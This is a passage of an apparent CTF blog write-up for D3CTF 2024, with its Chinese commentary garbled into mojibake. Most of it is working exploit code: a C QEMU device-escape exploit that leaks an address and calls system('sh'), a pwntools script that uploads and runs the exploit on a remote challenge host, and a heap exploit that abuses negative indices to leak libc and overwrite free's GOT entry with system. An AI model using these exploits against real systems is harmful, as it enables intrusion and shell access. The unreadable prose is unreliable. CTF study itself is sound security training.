class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> port_mem = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>  <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> inl(port_mem + port); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    outl(val, port_mem + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">666</span>); <span class="comment">// dest = 666</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>, <span class="number">0x80</span>);  <span class="comment">// *(_DWORD *)(v8 + 0xA00) = 0x80</span></span><br><span class="line">    pmio_read(<span class="number">8</span>);  <span class="comment">// dword_123B1CC++</span></span><br><span class="line">    <span class="type">uint32_t</span> leak = mmio_read(<span class="number">0x8c</span>);</span><br><span class="line">    <span class="type">uint32_t</span> low_system_addr = <span class="number">0xa610</span> + leak;</span><br><span class="line">    hexx(<span class="string">&quot;low_system_addr&quot;</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x94</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// addr_v7 = system(&quot;sh&quot;) % 0x100;</span></span><br><span class="line">    mmio_write(<span class="number">0x40</span>, <span class="number">0x6873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è„šæœ¬ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;106.14.121.29&#x27;</span>, <span class="number">30537</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;# &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># send_cmd(&#x27;cd /proc/141/net&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¯èƒ½ç”¨äººä¼šé—®ï¼Œåœ¨ <code>qemu</code> ä¸­æ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> ä¸æ˜¯æ— æ³• <code>getsell</code> çš„å—ï¼Œæ‰§è¡Œåä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ã€‚å…¶å®æ˜¯å¯ä»¥ <code>getshell</code> çš„ï¼Œä½†æ˜¯éœ€è¦é€šè¿‡ <code>pwntools</code> è¿æ¥åæ‰å¯ä»¥çœ‹è§å›æ˜¾ï¼Œå…¶æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2024/04/29/d3ctf2024/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h1 id="d3note"><a href="#d3note" class="headerlink" title="d3note"></a>d3note</h1><p>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_4011F2();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = sub_4011F2();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>));</span><br><span class="line">      *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v6) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">6425</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2064</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_4011F2();</span><br><span class="line">      sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v7 + <span class="number">1</span>), *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_4040A0 + <span class="number">4</span> * v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2064</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">276</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_4011F2();</span><br><span class="line">        v8 = sub_4011F2();</span><br><span class="line">        *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v4) = v8;</span><br><span class="line">        *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>((<span class="type">int</span>)v8);</span><br><span class="line">        sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>), v8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1300</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        v5 = sub_4011F2();</span><br><span class="line">        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v5 + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å¯çš„ä¿æŠ¤ï¼š  </p><img src="/2024/04/29/d3ctf2024/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è¿™é¢˜ç¬¬ä¸€çœ¼çœ‹ä¸Šå»å°±æ„Ÿè§‰æ˜¯ç»å…¸çš„èœå•é¢˜ï¼Œä½†æ˜¯çœ‹äº†åŠæ³•æ²¡æœ‰å‘ç°å †ä¸Šçš„æ¼æ´ï¼Œåé¢å‘ç°åœ¨è¾“å…¥å †å—ç´¢å¼•æ—¶ç¨‹åºå¹¶æ²¡æœ‰å¯¹è¾“å…¥çš„ç´¢å¼•è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨è´Ÿç´¢å¼•ã€‚ç”±äºæ²¡æœ‰å¼€å¯ <code>PIE</code> ä¸” <code>RELRO</code> çŠ¶æ€ä¸º <code>Partial RELRO</code>ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©åŠ«æŒ <code>free</code> çš„ <code>got</code> è¡¨ä¸º <code>system</code> ç„¶åé‡Šæ”¾æ‰ä¸€ä¸ªå†…å®¹ä¸º <code>sh</code> çš„å †å—æ¥å®ç° <code>getshell</code><br>è¿™é¢˜çš„ä¸€ä¸ªéš¾ç‚¹åœ¨äºå­˜å‚¨å †å—æŒ‡é’ˆçš„åœ°å€éƒ½æ˜¯ä»¥ <code>8</code> ç»“å°¾ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸å¥½æ³„éœ²åœ°å€ï¼Œç»è¿‡é•¿æ—¶é—´çš„æŸ¥æ‰¾æˆ‘æ‰¾åˆ°äº†å¯ä»¥åˆ©ç”¨çš„åœ°å€  </p><img src="/2024/04/29/d3ctf2024/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ‰€ä»¥æˆ‘é€‰æ‹©ä»¥è¿™é‡Œæ¥æ³„éœ² <code>libc</code> çš„åœ°å€å¹¶ä½œä¸ºè·³æ¿æ¥å®ç°ä¿®æ”¹ <code>free</code> çš„ <code>got</code> è¡¨<br>expï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.103.122.127&#x27;</span>,<span class="number">32244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">got = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">1918624</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc_base:<span class="subst">&#123;libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000029419</span>+libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000fd76d</span>+libc_base</span><br><span class="line">ret = libc_base + <span class="number">0x00000000000275f2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>)+p64(got)</span><br><span class="line">edit(-<span class="number">1460</span>,payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(-<span class="number">2</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å»å¹´çš„ <code>D3CTF</code> æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å’Œæ ¡é˜Ÿç»„é˜Ÿå‚åŠ æ¯”èµ›ï¼Œå½“æ—¶æˆ‘çš„ <code>pwn</code> æ°´å¹³è¿˜åœç•™åœ¨æ ˆæº¢å‡ºé˜¶æ®µï¼Œå®Œå…¨çš„è¢«è¿™ä¸€äº›é¢˜ç›®ç»™éœ‡æ’¼åˆ°äº†ã€‚ä»Šå¹´å†æ¬¡å‚åŠ  <code>D3CTF</code>ï¼Œå‘ç°é¢˜ç›®èƒ½çœ‹æ‡‚äº†ï¼ŒèŠ±ç‚¹æ—¶é—´é¢˜ç›®èƒ½åšå‡ºæ¥äº†ï¼Œçœ‹æ¥è¿™ä¸€å¹´çš„åŠªåŠ›è¿˜æ˜¯æœ‰é‚£ä¹ˆä¸€ä¸¢ä¸¢ä½œç”¨çš„ï¼Œä¸è¿‡è¿˜æ˜¯å¤„äºæ–°æ‰‹é˜¶æ®µï¼Œå¤ªå¼±äº†ï¼Œå“ã€‚æ¯”èµ›æœŸé—´çœŸçš„å¤ªå¿™å¤ªå¤šäº‹æƒ…äº†ï¼Œå¯¼è‡´æ²¡æœ‰ä»€ä¹ˆæ—¶é—´åšé¢˜ã€‚<code>qemu</code> é€ƒé€¸æ‰¾åˆ°æ¼æ´åå‘ç°å·²ç»ç»™ <code>xtx</code> å¸ˆå‚…åšå‡ºæ¥äº†å‘œå‘œå‘œï¼ˆå¤ªå¼ºæ‹‰  </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>When ELF notes reveal too much</title>
      <link href="/2024/04/17/notes/"/>
      <url>/2024/04/17/notes/</url>
      
